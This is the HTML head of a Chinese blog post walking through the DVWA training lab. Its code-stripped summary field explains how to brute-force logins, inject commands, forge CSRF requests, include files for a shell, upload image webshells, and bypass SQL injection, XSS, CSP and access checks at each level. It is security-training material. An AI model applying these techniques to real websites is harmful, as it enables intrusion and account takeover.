<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>重温DVWA | hybcx</title><meta name="keywords" content="web渗透"><meta name="author" content="hybcx,19815455497@163.com"><meta name="copyright" content="hybcx"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="重温DVWA"><meta name="application-name" content="重温DVWA"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="重温DVWA"><meta property="og:url" content="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/index.html"><meta property="og:site_name" content="hybcx"><meta property="og:description" content="0x01 Brute Force Low  这一部分处理用户输入的username与password(md5加密) &amp;#x2F;&amp;#x2F; Check the database     $query  &amp;#x3D; &amp;quot;SELECT * FROM &amp;#96;users&amp;#96; WHERE user &amp;#x3D; &amp;#39;$user&amp;#39; AND password"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta property="article:author" content="hybcx"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg"><meta name="description" content="0x01 Brute Force Low  这一部分处理用户输入的username与password(md5加密) &amp;#x2F;&amp;#x2F; Check the database     $query  &amp;#x3D; &amp;quot;SELECT * FROM &amp;#96;users&amp;#96; WHERE user &amp;#x3D; &amp;#39;$user&amp;#39; AND password"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://hybcx.xyz/2024/01/10/shen-ru-dvwa/"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d98ea8480e5ec98a243adfc7bd46b93a";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"向✌们无限学习","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3JLPGIZJOJw6Nvu2","LingQueMonitorID":"3JLPOLHV5W6IAty5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"Z7A3XW4R2I","apiKey":"12db1ad54372045549ef465881c17e743","indexName":"my-hexo-blog","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hybcx","link":"链接: ","source":"来源: hybcx","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'hybcx',
  title: '重温DVWA',
  postAI: '',
  pageFillDescription: '0x01 Brute Force, Low, Medium, High, Impossible, 0x02 Command Injection, Low, Medium, High, Impossible, 0x03 CSRF, Low, 配合XSS, Medium, High, JS发起HTTP CSRF请求, 常规 HTML 发起 CSRF 请求, Impossible, 0x04 File Inclusion, Low, 文件读取, 远程文件包含, 本地文件包含 Getshell, 远程文件包含 Getshell, 伪协议读取, Medium, High, Impossible, 0x05 File Upload, Low, Medium, High, Impossible, 0x06 Insecure CAPTCHA, Low, Medium, High, Impossible, 0x07 SQL Injection, Low, Medium, High, Impossible, 0x08 SQL Injection (Blind), Low, Medium, High, Impossible, 0x09 Weak Session IDs, Low, Medium, High, Impossible, 0x10 XSS(DOM), Low, Medium, High, Impossible, 0x11 XSS(Reflected), Low, Medium, High, Impossible, 0x12 XSS(Stored), Low, Medium, High, Impossible, 0x13 CSP Bypass, Low, Medium, High, Impossible, 0x14 JS Attacks, Low, Medium, High, Impossible, 0x15 Authorisation Bypass, Low, Medium, High, Impossible, 0x16 HTTP 重定向, Low, Medium, High, Impossible, 0x18 参考文章这一部分处理用户输入的与加密构造查询语句处理用户输入的用户名和密码接着与数据库连接进入数据库进行匹配查询这是扩展提供的函数用于执行查询第一个参数是连接标识符通常使用全局变量第二个参数包含查询的字符串如果前面的语句执行失败就会执行后面的代码后面的代码用于获取并输入错误信息首先判断是否为对象如果是这说明是存在连接错误并用函数获取具体的错误信息如果不是对象则用获取错误信息用于获取结果中的行数如果查询到了返回结果并且返回的结果行数为这说明成功找到对应的用户数据从结果中取得一行作为关联数组并获取该关联数组键值为对应的随后就是一些信息的展示调用关闭连接并将关闭结果的布尔值赋值为对应的变量如果成功关闭返回否则返回变量本身的综上分析该网站对于用户的登录次数并没有做出任何限制可以尽情的爆破值得注意的是这里的代码也没有对用户输入的数据进行过滤这表明我们可以通过注入进去但这里不能使用联合注入因为并不会回回显相关查询信息但幸运的是我们可以进行万能密码和报错注入因为的存在当然盲注也是可以的但手工效率低中级水平如上所示在开始的地方分别对用户输入的与数据由进行处理对用户输入的特殊字符进行转义特殊字符如下剩下的基本一致亮点在于这里如果用户输入的数据与数据库数据不匹配则会休眠秒但这对我们的爆力破解是无用的只不过延长了我们爆破的时间首先调用了个自定义函数并向其中传入用户的令牌以及会话并且在对用户的用户名和密码输入方面添加了进行处理在于删除用户输入的数据中可能含有的反引号这里依旧同之前的难度基本一致不过睡眠时间成了随机了最后这里说该函数是用来生成令牌的综上所述这里防止了的攻击但我们仍可以进行暴力破解不过麻烦的事需要在每次破解的时候抓取页面的令牌这里我们关注一下的处理的值来源于访问查看源码信息找到如下的位置我们追踪位置发现如下代码这里的用于检查用户令牌如果用户令牌与会话不相等则报错并且还会重定向到而后续的函数用当前的时间戳值来生成这里复习一波如何用来爆破抓包看到这里多了两个参数但只需要关注即可值得注意的是这里含有重定向因此我们在设置的时候需要跟随以便获取页面的某些数据这里看到文章说线程最好设置为多线程基本不行这里我们设置爆破点为与其中为正常的密码字典即可设置为递归提取递归主要用于从服务器端提取有效数据需先从服务器响应中提取数据在替换位置进行正则配置注意使用递归搜索时线程必须是根据上述图片的步骤设置好对于的查找我们在图片右侧选择获取响应接着在下面的响应中找到所在位置鼠标选中即可接着你会看到上方已经自动生成好了正则表达式如上图成功爆破前面的某些部分与一般我们重点看新增的创建一个准备语句该语句用于执行查询查询的目标是从名为的表中选择和列的值条件是列等于提供的参数确保只返回一行数据绑定参数这是一个占位符与预备语句中的对应将变量绑定到这个参数并指定参数类型为字符串之后便是执行该语句并获取返回结果中的每一行数据之后如果返回结果中如果只有一行数据且登陆失败的值大于指定的登录失败的值就进入循环根据注释这代表着用户已经被锁定用户被锁定注意使用此方法可能导致用户枚举由于登录错误次数过多此帐户已被锁定计算用户何时可以再次登录这里获取最后一次登录的时间接着也就是禁用分钟接着获取当前时间如果当前时间小于规定的禁用时间则账户依旧处于被锁定的状态这里同上述一般也是进入数据库查询用户输入的内容是否与其匹配这里说如果用户的内容在数据库中可以找到并且用户未处于锁定状态说明用户成功登录进入后获取了到目前为止登陆失败的次数与上一次登录的时间然后判断登录次数是否大于网站限制的登录次数如果超过了则会提醒用户在此次登录之前你的账号存在被暴力破解的危险然后重置登陆失败的次数为因为成功登陆了这里是语句如果用户未能成功登录则会将当前用户对应的登陆失败的次数其实这里的代码逻辑应该是先看下部分在看上部分那由于这里对爆破次数做了限制次这几乎断绝了我们破解成功的几率这里配合参数最终会返回运行次环境的操作系统信息看是否为系统根据系统的类别使用适配的用法这里显而易见没有对用户输入的参数做出有效的过滤这意味着我们可以配合管道符进行命令执行由于这里我是下的我们先简单了解一下下的管道符相关用法前面需要正确然后显示后面语句的执行结果如果前面执行的语句执行出错则执行后面的语句前面的语句只能为假如果前面的语句为假则直接执行后面的语句前面的语句为真则依次执行如果前面的语句为假则直接出错也不执行后面的语句前面的语句只能为真这里我们可以配合管道符进行命令执行如上图所示我们成功看到当前目录信息当然也可以进行文件读取这里上一个最大的不同就在于设置了黑名单并且过滤了与分号不过这并不影响我们因为这里过滤并不全我们依旧可以向上一关一样进行文件读取等命令执行去除字符串首尾处的空白字符或者其他字符如上所示这串代码先用去除了参数内容的空格等字符随后用更加严格的黑名单进行了过滤虽然看着很全但仔细观察会发现其对的过滤实际上是这样的附加了一个空格这估计是模拟现实中开发人员的失误这意味着我们使用依旧可以命令执行去除反斜杠字符将使用符号分隔开这里限制死了的每一段都需要为整数且整个只能有四个网段如上所示这里先是判断用户令牌防止了攻击接着去除了参数的反斜杠字符然后将内容以点号分隔开分别判断得到的数组每一位数组元素是否为整数且整个数组长度只能为否则将被视为无效这种就是白名单过滤的方式了只要不符合正确的格式则抛出错误这里我们是无法绕过的这里直接对用户输入的密码判断是否在两次输入中相等如果相等就直接更新密码并没有对访问来源等做出限制很明显这里并不能有效的阻止的存在如果用户访问我们精心构造的恶意链接就会造成造成恶意代码执行攻击思路如下如果用户在当前网站访问上述链接那就会执行密码修改的功能倘若这时候我们知道了用户名则我们可以成功冒充用户登录当然如果对方有点防范意识的话就不会点击上述很明显可疑的网址那我们先搞一个简单的短网址来攻击在线工具生成如下可以看到成功伪造配合这种和结合成功率很高攻击更加隐蔽首先新建一个带有攻击语句的页面内容如下当受害者访问含有这个代码的页面的时候用户的密码就被恶意修改了核心语句就是通过标签的属性来记载攻击的当然还可以使用等标签关键代码如下这是一个请求头它包含了当前请求的来源页面的这是当前服务器的主机名这里判断用户访问该网站的来源地址是否与网站的相同如果不相同这说明来源有问题如果一致则认为是真正的用户接着更新密码同时拒绝了注入同时这关放弃了的检验这里就是考察我们对于的理解了由于该函数只是判断待查询字符串是否包含指定的字符这意味着我们造构造恶意网址的时候只需要在网址中包含与正确网站的相同的部分即可首先精心构造一个页面当用户访问该页面的时候由于的执行导致用户自动提交给了上面表单内容进行密码的修改接下来就是对于该页面网址的构造了目录混淆将上述页面放到服务器的目录下然后让用户访问自动触发提交然后访问构造好的地址文件名混淆将上述文件重命名为然后访问如下这里有师傅提醒这里有一个小细节如果目标网站是的话那么的这个页面也要是协议如果是协议的话就会失败具体自行测试拼接混淆因为后默认当做参数传递这里因为页面是不能接受参数的所以随便输入是不影响实际的结果的利用这个特点来绕过的检测这串代码主要是判断用户传入的数据是否为类型如果是的话进行解密传给接着判断是否存在四个指定的变量如果存在则各自赋值如果不是数据类型则仍然判断是否存在这四个变量如果存在则分别赋值这里显示检查了用户是否与匹配然后判断两次密码输入是否一致如果一致则直接进行密码的更新同时防止了注入的可能很明显这里并不能有效的阻止的存在只要我们想办法可以获取到用户的即可成功攻击发起请求新建一个文件首先访问这个页面来获取使用正则提取发起请求将带入将这个上传到外网的服务器上随后访问的级别插入恶意代码这里直接通过标签的来引入外部访问之后此时密码就被更改为了另外这里学习了国光师傅的另一种思路常规发起请求假设攻击者这里可以将保存上传到的跨域白名单下的话那么这里也可以通过这种组合式的攻击将上述文件保存为然后放入到白名单目录下这在实战中比较少见这里为了演示效果我们可以将这个文件放入到靶场服务器的根目录下然后直接访问这个页面即可发起攻击与之前的级别不同点在于这里增加了一个输入框要求用户写出当前密码只有当前密码是正确的才会执行修改密码的操作这对于不知道受害者原始密码的攻击者来说根本无法完成攻击了可以看到非常捡漏对于参数没有做任何限制这意味着我们可以实现任意文件包含而这里的包含函数并不在此代码中文件读取正常在下是是要读取等文件的远程文件包含本地文件包含这里需要匹配文件上传漏洞来进行本地包含远程文件包含当然这里也可以包含远程服务器上的恶意文件就不演示了伪协议读取解码即可不过这里不知道是和原因发不出去只能发送伪协议数据封装器和相似可以直接执行任意代码这里加了几个过滤将协议与协议过滤为空以及防止目录穿越但这里我们注意到没有过滤伪协议以及它仅仅是将敏感字符过滤为空这意味着我们可以双写绕过同样的远程文件包含也可以双写绕过这里说如果参数不是以开头的或者不是则退出很明显可以用伪协议这里进行了白名单过滤如果不是这三个指定文件中的一个则退出很明显我们无法进行攻击了首先自定义了上传路径接着直接对参数内容进行上传并没有对内容做出过滤很明显可以任意文件上传这里将上传文件路径输出了直接跟着路径访问即可依旧是定义了上传路径接着取出了上传文件的文件名文件类型文件大小如果文件类型不是或者且文件上传大小超出了限制则上传失败否则成功上传但这里只是对做出了限制我们修改即可这里是取出了文件上传时的后缀名如果不是或者或者则上传失败同时还使用函数检测上传的文件是否为图片这里可以使用图片马绕过下图片马的制作将内容追加到合成图马直接追加下图片马的制作正常制作图片马上传即可接着利用上一关的文件包含漏洞包含使其解析其中的代码即可使用了时间戳的值做文件名然后添加文件后缀接着判断后缀名以及类型和检测是否为图片同时使用等类似函数删除掉了元数据创建新图像意味着图片马也无法绕过了前半部分代码如上这里看到他会先去判断验证码是否正确如果正确才会接着去判断密码修改情况否则报错关键在于第二部分代码这里在语句的开头都对的参数做了判断如果是的话就默认为经历了的验证码的验证接着取将修改后的密码直接插入数据库更新同时防止了注入这意味着我们可以在修改密码之后抓包修改的值来绕过这里与上一关的不同点在于上述图片中的表单中添加了一个隐藏元素并被设置为了这会被用于第二步他会判断表单元素是否存在也就是判断了这一步是否被执行过但我们依旧可以修改绕过只需要抓包修改为进入第二个判断接着添加元素为即可与前几个级别不同点在于这一关取消了的判断但却在判断验证码是否正确的同时多了如下代码这明摆着直接修改即可如下图添加的同时修改头即可绕过但这里我似乎还需要删除这个参数才能成功不知为何这一关添加了反正了同时添加了要求用户填写当前密码的功能也防止了注入接着判断验证码是否匹配很明显这里修改了前几个级别犯的错误我们已经没有办法通过增删参数来绕过了如上图所示这里显示判断数据库类型并不需要在意随后对用户输入的参数进行拼接语句查询然后直接连接数据库查询对应的数据并未做出任何过滤我们只需要正确闭合语句即可由于代码本身就支持展示多行数据也就没必要搞什么分隔符之类的来明晰数据了修改的点在于采用函数来对特殊字符进行转义其中特殊字符如下图所展示但这里幸运的是改为了数字型查询但这里有限制的点在于当我们查到表名为接来下回去查询中的列名那无疑是需要单引号或者双引号包围的但我们可以通过进制绕过因为数据库对进制数据会自动转换为进制识别这一级别与第一关类似只不过的位置在并不在页面当中了我们在输入框中输入即可这里多了一个的验证同时判断用户输入的是否为数字类型如果不是直接无效如果是的话强制转换为整数类型接着采用预编译导致我们无法进行语句的闭合预编译语句的优势在于归纳为一次编译多次运行省去了解析优化等过程此外预编译语句能防止注入上述两处代码结合会发现即使我们查询成功也只会显示是否成功的消息展示并不会将数据显示出来这意味着我们只能进行盲注了同时这与注入类似并不没有做出任何过滤依旧是盲注虽然这里对参数做了特殊字符转移但类似的注入我们依旧是可以绕过的比如进制交给完全可以不同点在于的位置换成了但仍然没有做出有效的限制依旧可以这一等级同样采用了的预编译防止检查是否为数字型一种通过窃取用户使用该登录进目标账户的攻击方法此时攻击者实际上是使用了目标账户的有效如果是保存在中的则这种攻击可以称为劫持还可以保存在中作为一个请求的一个参数但是这种方式的安全性难以经受考验这里的代码逻辑是只要方法请求一次就会令当然如果不存在的话置零这很容易让攻击者伪造我们这里抓包一次发现如下当我们将这个复制下来然后换一个浏览器访问该对应的会发现不需要登录直接就到达指定页面这里是采用时间戳作为会话但是这里时间戳也是有规律可循的是可以伪造的我们采用时间戳转换工具这里我们可以选一个未来的时间并转换为时间戳接着我们可以诱骗用户在这一时间点击这一关的按钮当其点击过之后我们便可以成功进行伪造了将我们准备的时间戳伪造成接着换一个其他浏览器发送即可绕过登录这里与第一个级别类似不过这里的经过了加密我们抓包的时候可以很容易看出来的迹象的经过一个解密即可知道是由数字开始之后得到的整数的加密值依旧很容易构造这里设置了随机数然后拼接当前时间戳和最后经过加密如果我们不能得到随机数种子以及后面的字符是根本无法构造的这只是代码审计的前提下才知道其构造原理如果单纯抓包等等基本不可能判断出来其产生原理无任何保护我们看一下页面关于此处的源码很明显这里对用户的输入复制给了变量接着在没有任何过滤的情况下直接进行解码拼接到函数下这里过滤了标签但我们还可以选择更多的标签来绕过但毕竟我们换了标签必须要闭合前面的标签否则这里的标签便不起作用了闭合与标签即可这里说如果的值不是上面四个指定的值中的一个则直接无效这里学了师傅们的两个思路方法一可以使用连接另一个自定义变量来方法二使用来注在中后边的内容不会发送到服务端从而可以实现绕过可以看见客户端这里对我们的输入的数据不进行解码了这样会导致标签失效从而无法这里只是判断是否存在变量如果存在直接插入标签中不存在任何过滤将过滤为空这意味着可以大写或者双写绕过过滤很全将标签中的每个字符都过滤了但我们可以使用其他标签防止接着采用杜绝了特殊字符这意味着我们的任何事件标签都将无用对字符串收尾去空取出反引号可以看见对用户的输入在经过几个函数的处理后插入了数据库但并未做出对的过滤但防止注入可以看到当我们插入上述数据的时候每当我们访问此页面便会执行可以看到这回对做出了成功的过滤但却忘记正确过滤只是将标签替换为空但这里由于对这一文本框有字数限制但我们可以放到上或者直接在中直接修改可以看到成功类似还有当然还可以审查元素手动将的值调大一点就可以了这里同样对做出了严格的过滤但对只是单纯过滤了标签这并没有什么用防止注入同时对与的内容都做出了相同且严格的过滤这是无法绕过的内容安全策略使服务器管理员可以通过指定浏览器应认为是可执行脚本的有效源的域来减少或消除可能发生的向量然后兼容的浏览器将仅执行从这些允许列出的域接收的源文件中加载的脚本忽略所有其他脚本包括内联脚本和事件处理属性除了限制可以从中加载内容的域之外服务器还可以指定允许使用哪些协议例如理想情况下从安全角度来看服务器可以指定必须使用加载所有内容完整的数据传输安全策略不仅包括强制进行数据传输还包括使用安全标记标记所有并提供从页面到其对应项的自动重定向站点还可以使用标头来确保浏览器仅通过加密通道连接到它们两种方法可以启用一种是通过头信息的的字段一种是通过网页的标签这里可以看到网站通过添加头信息的的字段来开启要求本页面只能加载来自自身的或者这些网站的脚本代码其中是一个快速分享文本内容的网站这个内容我们是可控的可以在这里面插入攻击语句我们在上述网站构造语句之后记录下生成的网址接着放入的文本输入框中点击即可触发但我这里不知为何没有反应这里还可以配合让攻击更加自动化将上述内容保存为然后上传到公网服务器上将这个地址想方设法让受害者访问的话就会自动触发和攻击这里可以采用短网址钓鱼邮件等方法指定允许执行代码的来源在这里表示只允许从同一域名加载脚本允许内联脚本的执行即在中直接嵌入的脚本使用一次性随机值来标识允许执行的脚本在这里指定了一个特定的值只有包含这个的脚本才会被执行由于这一关允许内联脚本执行因此我们直接构造即可但要注意需要包含上述指定的值之后直接输入文本框提交即可这里做出了严格的限制只允许加载来自自身网站的脚本但好在页面中有如下提示说这个网站页面会加载下的的代码对应内容如下判断变量是否存在与传参中如果存在的话则会与解码出来的数据一同拼接输出同时页面代码还存在自动加载文件我们追踪看看这里表名当我们点击为的元素之后便会调用函数位置如下该函数会创建一个标签这个时候浏览器就会发起如下请求访问这个会得到如下请求如果我们将改为之类的就会触发弹窗那接下来就是想办法如何修改参数了幸运的是这里留了一个参数并且该参数内容会直接插入中我们直接利用即可但这里并不是直接插入标签因为没有因此并不会当做脚本执行构造如下这里加载的代码并修改参数即可成功弹窗这里主要是下面文件发生了改动这里指定了只能输出这里也就写死了没法绕过可以到上述代码主要是用来生成一个大概逻辑看看我们可以知道上述代码会在前端找一个名为的元素随后拿到其值接着按该值生成独属于其的元素位置如下而这里倘若我们直接将其修改为会发现页面说我们是一个无效的这是因为我们采用的是的因此我们需要想办法拿到生成的幸运的是这在前端就生成了我们只需要改一下的值在前端运行一下即可这里在开发者工具中找到对应的代码地址在生成函数的地方下一个断点接着刷新页面运行之后会在右侧出现接着修改其值为之后继续运行会发现发生了变化这时我们直接修改为提交会发现提交成功我们跟踪这里看了一下逻辑发现其会取的值为名为的值接着传给函数该函数将传入的参数倒序输出我们看到上述的值为这意味着我们只需要将其改为即可可以看到成功修改这里的代码是被混淆了我们用在线网站解密一下重点代码在后面这里首先将的赋值为空接着调用函数将的值倒序输出随后延迟调用函数经过加密赋值给的然后当我们点击按钮时调用函数将值拼接接着经过加密赋值给的这里可以看到我们输入的与这些代码根本无关因为其的值始终被设置为我们进调试看看我们在右侧下个对于鼠标的断点接着我们点击上面的文本框会发现我们成功进入断点调试接着一直按运行键会发现左侧出现了我们之前解混淆的代码接着我们对函数下断点同时取消对的断点然后去控制台设置的值为按下图所示接着回车一下随后放行会发现在输入框中出现接着我们点击按钮发送即可发现成功修改直接把用户输入的地方关了这无从下手了这意味着这是一个未授权访问的漏洞我们的目标是以这一低级别用户访问管理员才可以访问的页面可见这里没有任何限制是存在未授权访问的让我们先以低级别用户登录看看如上图可以看到我们当前用户是没有权限访问到刚才的页面的接下来我们尝试抓包看一下刚刚管理员页面的地址如上图接下来让我们尝试直接访问该地址可以看到成功未授权这里他会判断该用户是否为如果不是则返回但值得注意的是这段代码似乎只是检查页面我们继续抓一下看看该页面的功能点可以看到当我们点击按钮的时候我们实际上是被页面进行处理接下来我们可以猜测该页面没有做未授权处理我们可以尝试直接访问该页面看看可以看到虽然其只对做了限制当我们访问的时候仍然可以得到一些数据依旧是相同的代码我们接着上一个级别的思路访问一下发现行不通了这个接口也被禁用了接下来我们在管理员界面的更新数据地方进行抓包如下图发现这里的接口改为了功能而我们可以注意到上一个级别是功能这不禁让我们猜测该功能可能并没有做出有效的未授权访问限制跟踪相关代码也可以发现这里只对级别做出的严格限制接下来我们用其他用户访问该页面同时抓包用户的功能对应的数据包接下来尝试将上面的数据赋值到下面的普通用户数据包中点击发送可以看到右侧回显访问成功的标志这里的代码依旧没有什么变化但我们跟踪相关文件可以发现这两个功能文件在对级别上都做出了严格的限制只要当前用户不是则无权访问这是无法绕过的这里经过测试发现直接显示无权访问重定向这里判断参数是否通过传参是否存在如果存在则直接重定向到随后结束脚本执行否则页面返回响应这里并没有任何过滤我们可以重定向到任何页面这里限制了参数以或者开头也就是不能以绝对的开头但是我们可以使用相对的这里借用阮一峰老师对相对与绝对的解释分成两种绝对和相对绝对指的是只靠本身就能确定资源的位置这意味着必须带有资源的完整信息包含协议主机路径等部分前面的例子都是绝对相对指的是不包含资源位置的全部信息必须结合当前网页的位置才能定位资源比如当前网页的是该网页上面有一个资源指向这个就是相对因为只知道并不能定位资源浏览器假定与当前网址在同一个子目录下面从而得到绝对相对如果以斜杠开头就表示网站的根目录否则必须以当前目录为起点推算资源的位置比如相对表示网站根目录的子目录表示在当前目录的子目录还可以使用两个特殊简写表示特定位置表示当前目录比如当前目录下的文件表示上级目录比如上级目录下的文件这两种简写可以多个连用比如表示上两级目录绝对也可以使用这两个简写比如等同于这时相当于根目录的当前目录即根目录本身因此这一关我们可以这样构造这里检查中是否含有字符串如果含有才会正常的去请求重定向否则返回由代码审计得在构造参数时是指包含字符串即可已定义参数注意需要参考网页支持的参数来传递例如当该网页没有设定参数的传参时是无效的因为字符串并未传递给合法的参数这里采用了表名单过滤并且将参数内容转换为了整数这意味着对我们来说已经不可控了参考文章网络安全之攻击姿势及解题详析合集绝对和相对入门靶场学习记录',
  isPost: true,
  isHome: false,
  isHighlightShrink: true,
  isToc: true,
  postUpdate: '2024-01-14 19:03:04',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0">
